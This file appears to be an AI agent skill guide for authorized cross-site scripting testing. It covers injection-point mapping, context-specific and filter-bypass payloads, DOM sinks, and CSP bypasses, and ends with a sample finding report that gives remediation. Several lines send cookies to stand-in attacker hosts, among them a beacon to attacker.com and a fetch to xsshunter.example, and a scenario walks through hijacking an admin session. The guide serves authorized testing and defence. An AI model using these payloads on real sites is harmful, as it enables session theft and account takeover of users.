@@ -1,0 +1,226 @@
+\title{Testing For Xss Vulnerabilities}
+
+\taxon{skill}
+
+\tag{XSS}
+
+\tag{cross-site-scripting}
+
+\tag{client-side-security}
+
+\tag{OWASP-A03}
+
+\tag{JavaScript-injection}
+
+\meta{version}{1.0.0}
+
+\meta{description}{Tests web applications for Cross-Site Scripting (XSS) vulnerabilities by injecting JavaScript payloads into reflected, stored, and DOM-based contexts to demonstrate client-side code execution, session hijacking, and user impersonation. The tester identifies all injection points and output contexts, crafts context-appropriate payloads, and bypasses sanitization and CSP protections. Activates for requests involving XSS testing, cross-site scripting assessment, client-side injection testing, or JavaScript injection vulnerability testing.}
+
+\subtree{
+\title{Testing for XSS Vulnerabilities}
+\subtree{
+\title{When to Use}
+\ul{
+\li{Testing web applications for client-side injection vulnerabilities as part of OWASP WSTG testing}
+\li{Evaluating the effectiveness of input sanitization and output encoding across all application features}
+\li{Assessing the protection provided by Content Security Policy (CSP) headers against XSS exploitation}
+\li{Demonstrating the impact of XSS through session hijacking, credential theft, or phishing overlay to stakeholders}
+\li{Testing single-page applications (React, Angular, Vue) for DOM-based XSS in client-side routing and rendering}
+}
+
+\p{\strong{Do not use} against applications without written authorization, for deploying persistent XSS payloads that affect real users, or for exfiltrating actual user session tokens from production environments.}
+}
+
+\subtree{
+\title{Prerequisites}
+\ul{
+\li{Authorized scope defining the target web application and acceptable testing activities}
+\li{Burp Suite Professional with XSS-focused extensions (XSS Validator, Reflector, Active Scan++)}
+\li{Browser with developer tools and XSS testing extensions (HackBar, XSS Hunter)}
+\li{XSS Hunter or Burp Collaborator for out-of-band payload verification}
+\li{SecLists XSS payload lists and custom payloads for WAF bypass scenarios}
+}
+
+\blockquote{\strong{Legal Notice:} This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.}
+}
+
+\subtree{
+\title{Workflow}
+\subtree{
+\title{Step 1: Input and Output Mapping}
+\p{Map every location where user input enters and is rendered by the application:}
+
+\ul{
+\li{\strong{Reflected inputs}: Test every URL parameter, search field, error message, and HTTP header value that is reflected in the response}
+\li{\strong{Stored inputs}: Identify features where input is saved and displayed later: user profiles, comments, forum posts, file names, support tickets, and chat messages}
+\li{\strong{DOM inputs}: Identify client-side JavaScript that reads from \code{\startverb location.hash\stopverb}, \code{\startverb location.search\stopverb}, \code{\startverb document.referrer\stopverb}, \code{\startverb window.name\stopverb}, \code{\startverb postMessage\stopverb}, or \code{\startverb localStorage\stopverb} and writes to the DOM}
+\li{\strong{Output context identification}: For each reflected input, determine the rendering context:}
+\li{HTML body: \code{\startverb <div>USER_INPUT</div>\stopverb}}
+\li{HTML attribute: \code{\startverb <input value="USER_INPUT">\stopverb}}
+\li{JavaScript string: \code{\startverb var x = 'USER_INPUT';\stopverb}}
+\li{URL context: \code{\startverb <a href="USER_INPUT">\stopverb}}
+\li{CSS context: \code{\startverb <div style="color: USER_INPUT">\stopverb}}
+}
+}
+
+\subtree{
+\title{Step 2: Reflected XSS Testing}
+\p{Test reflected injection points with context-appropriate payloads:}
+
+\ul{
+\li{\strong{HTML body context}: \code{\startverb <script>alert(document.domain)</script>\stopverb}, \code{\startverb <img src=x onerror=alert(1)>\stopverb}, \code{\startverb <svg onload=alert(1)>\stopverb}}
+\li{\strong{HTML attribute context}: \code{\startverb " onfocus=alert(1) autofocus="\stopverb}, \code{\startverb " onmouseover=alert(1) "\stopverb}, \code{\startverb "><script>alert(1)</script>\stopverb}}
+\li{\strong{JavaScript string context}: \code{\startverb ';alert(1)//\stopverb}, \code{\startverb \';alert(1)//\stopverb}, \code{\startverb </script><script>alert(1)</script>\stopverb}}
+\li{\strong{URL/href context}: \code{\startverb javascript:alert(1)\stopverb}, \code{\startverb data:text/html,<script>alert(1)</script>\stopverb}}
+\li{\strong{Inside HTML comments}: \code{\startverb --><script>alert(1)</script><!--\stopverb}}
+\li{\strong{Filter bypass payloads} (when basic payloads are blocked):}
+\li{Case variation: \code{\startverb <ScRiPt>alert(1)</sCrIpT>\stopverb}}
+\li{Event handlers: \code{\startverb <details open ontoggle=alert(1)>\stopverb}}
+\li{SVG: \code{\startverb <svg><animate onbegin=alert(1) attributeName=x>\stopverb}}
+\li{Encoding: \code{\startverb <img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>\stopverb}}
+}
+}
+
+\subtree{
+\title{Step 3: Stored XSS Testing}
+\p{Test persistent storage points that render input to other users:}
+
+\ul{
+\li{Submit XSS payloads to every stored input field identified in Step 1}
+\li{Use a unique identifier in each payload to track which inputs trigger: \code{\startverb <script>alert('XSS-PROFILE-001')</script>\stopverb}}
+\li{Check all locations where the stored input is rendered (the same input may appear on multiple pages)}
+\li{Test file upload features with HTML files containing JavaScript, SVG files with embedded scripts, and filenames containing XSS payloads}
+\li{Test rich text editors by injecting payloads through the raw HTML mode or by manipulating the POST data after the client-side editor sanitizes}
+\li{Use XSS Hunter payloads (\code{\startverb "><script src=https://yourxsshunter.xss.ht></script>\stopverb}) for blind stored XSS where the payload fires in an admin panel or internal tool you cannot directly access}
+}
+}
+
+\subtree{
+\title{Step 4: DOM-Based XSS Testing}
+\p{Analyze client-side JavaScript for unsafe DOM manipulation:}
+
+\ul{
+\li{\strong{Source identification}: Search JavaScript for dangerous sources that read attacker-controlled input:}
+\li{\code{\startverb document.location\stopverb}, \code{\startverb document.URL\stopverb}, \code{\startverb document.referrer\stopverb}}
+\li{\code{\startverb location.hash\stopverb}, \code{\startverb location.search\stopverb}, \code{\startverb location.href\stopverb}}
+\li{\code{\startverb window.name\stopverb}, \code{\startverb postMessage\stopverb} event data}
+\li{\strong{Sink identification}: Search for dangerous sinks that write to the DOM:}
+\li{\code{\startverb innerHTML\stopverb}, \code{\startverb outerHTML\stopverb}, \code{\startverb document.write()\stopverb}, \code{\startverb document.writeln()\stopverb}}
+\li{\code{\startverb eval()\stopverb}, \code{\startverb setTimeout()\stopverb}, \code{\startverb setInterval()\stopverb}, \code{\startverb Function()\stopverb}}
+\li{\code{\startverb element.setAttribute()\stopverb} with event handlers, \code{\startverb jQuery.html()\stopverb}, \code{\startverb .append()\stopverb}, \code{\startverb v-html\stopverb} (Vue), \code{\startverb dangerouslySetInnerHTML\stopverb} (React)}
+\li{\strong{Trace data flow}: Follow the path from source to sink. If user-controlled input reaches a dangerous sink without proper sanitization, DOM XSS exists.}
+\li{\strong{Framework-specific testing}: Test React \code{\startverb dangerouslySetInnerHTML\stopverb}, Angular template injection (\code{\startverb {{constructor.constructor('alert(1)')()}}\stopverb}), Vue \code{\startverb v-html\stopverb} directive}
+}
+}
+
+\subtree{
+\title{Step 5: CSP Bypass and Advanced Exploitation}
+\p{Test Content Security Policy effectiveness and demonstrate real-world impact:}
+
+\ul{
+\li{\strong{CSP analysis}: Review the CSP header for weaknesses:}
+\li{\code{\startverb unsafe-inline\stopverb} in script-src allows inline scripts}
+\li{\code{\startverb unsafe-eval\stopverb} allows eval() and similar functions}
+\li{Wildcard domains (\code{\startverb *.googleapis.com\stopverb}) may host JSONP endpoints usable for CSP bypass}
+\li{\code{\startverb base-uri\stopverb} not set allows \code{\startverb <base>\stopverb} tag injection to redirect relative script loads}
+\li{\strong{JSONP bypass}: If CSP allows a domain with JSONP endpoints, use \code{\startverb <script src="https://allowed-domain.com/jsonp?callback=alert(1)"></script>\stopverb}}
+\li{\strong{Impact demonstration}:}
+\li{Session hijacking: \code{\startverb <script>new Image().src="https://attacker.com/steal?c="+document.cookie</script>\stopverb}}
+\li{Credential phishing: Inject a fake login form overlay that submits to the attacker's server}
+\li{Keylogging: Inject JavaScript that captures keystrokes on the page}
+\li{Account takeover: Use XSS to change the victim's email address and trigger a password reset}
+}
+}
+}
+
+\subtree{
+\title{Key Concepts}
+\pre{\startverb
+| Term | Definition |
+|------|------------|
+| **Reflected XSS** | Non-persistent XSS where the injected payload is included in the server's response to the same request, requiring the victim to click a crafted URL |
+| **Stored XSS** | Persistent XSS where the payload is saved on the server and served to other users who view the affected page |
+| **DOM-Based XSS** | XSS that occurs entirely in the browser when client-side JavaScript reads attacker-controlled data and writes it to a dangerous DOM sink |
+| **Content Security Policy** | HTTP response header that restricts which sources the browser can load scripts, styles, and other resources from, providing defense-in-depth against XSS |
+| **Output Encoding** | Converting special characters to their HTML entity equivalents (e.g., `<` to `&lt;`) to prevent the browser from interpreting user input as code |
+| **Sink** | A JavaScript function or DOM property that can cause code execution or HTML rendering if attacker-controlled data reaches it unsanitized |
+\stopverb}
+}
+
+\subtree{
+\title{Tools & Systems}
+\ul{
+\li{\strong{Burp Suite Professional}: HTTP proxy with active scanning for reflected and stored XSS, plus Repeater and Intruder for manual payload testing}
+\li{\strong{XSS Hunter}: Hosted service that generates payloads which phone home with screenshots, cookies, and DOM content when triggered, essential for blind stored XSS}
+\li{\strong{DOMPurify}: Client-side sanitization library used by developers to prevent XSS; testers should test for bypass techniques against the deployed version}
+\li{\strong{Browser Developer Tools}: Console, Network, and Elements tabs for tracing DOM-based XSS data flows and testing payloads in real-time}
+}
+}
+
+\subtree{
+\title{Common Scenarios}
+\subtree{
+\title{Scenario: Stored XSS in Customer Support Ticket System}
+\p{\strong{Context}: An e-commerce platform has a customer support system where customers submit tickets that are viewed by support agents in an internal admin panel. The ticket submission form accepts HTML formatting.}
+
+\p{\strong{Approach}:}
+
+\ol{
+\li{Submit a support ticket with a unique XSS Hunter payload in the ticket description}
+\li{The payload fires when a support agent views the ticket in the admin panel, sending a callback with the agent's session cookie, page DOM, and screenshot}
+\li{Use the captured admin session cookie to access the admin panel as the support agent}
+\li{From the admin panel, access customer records, order data, and refund functionality}
+\li{Document the attack chain: customer submits ticket -> agent views ticket -> XSS fires -> session stolen -> admin panel compromised}
+\li{Test if CSP would have prevented the attack (in this case, no CSP header was present)}
+}
+
+\p{\strong{Pitfalls}:}
+
+\ul{
+\li{Only testing for \code{\startverb <script>alert(1)</script>\stopverb} and missing XSS that fires through event handlers or in non-HTML contexts}
+\li{Not testing stored XSS in features that render to administrative users (support tickets, user profiles viewed by admins)}
+\li{Ignoring DOM-based XSS in single-page applications where the server-side code is secure but client-side rendering is vulnerable}
+\li{Not checking for XSS in HTTP headers (Referer, User-Agent) that may be logged and rendered in admin dashboards}
+}
+}
+}
+
+\subtree{
+\title{Output Format}
+\pre{\startverb
+## Finding: Stored XSS in Support Ticket Description
+
+**ID**: XSS-002
+**Severity**: High (CVSS 8.1)
+**Affected URL**: POST /api/tickets (submission), GET /admin/tickets/8847 (trigger)
+**Parameter**: description (POST body)
+**XSS Type**: Stored (persistent)
+
+**Description**:
+The support ticket description field does not sanitize HTML input before storing
+it in the database. When a support agent views the ticket in the admin panel, the
+unsanitized HTML is rendered in the agent's browser, allowing arbitrary JavaScript
+execution in the context of the admin application.
+
+**Proof of Concept**:
+Submitted ticket with payload:
+<img src=x onerror="fetch('https://xsshunter.example/callback?c='+document.cookie)">
+
+The payload fired when the agent viewed the ticket, exfiltrating the admin session
+cookie to the XSS Hunter server.
+
+**Impact**:
+An attacker can steal the session tokens of support agents and administrators,
+gaining access to the admin panel with privileges to view customer PII, process
+refunds, and modify orders. Affects all 23 support agents who view customer tickets.
+
+**Remediation**:
+1. Implement output encoding using a context-aware library (OWASP Java Encoder,
+   DOMPurify for client-side rendering)
+2. Deploy Content Security Policy header:
+   Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
+3. Set HttpOnly flag on session cookies to prevent JavaScript access
+4. Sanitize HTML input server-side using a whitelist approach (allow only safe tags)
+\stopverb}
+}
+}
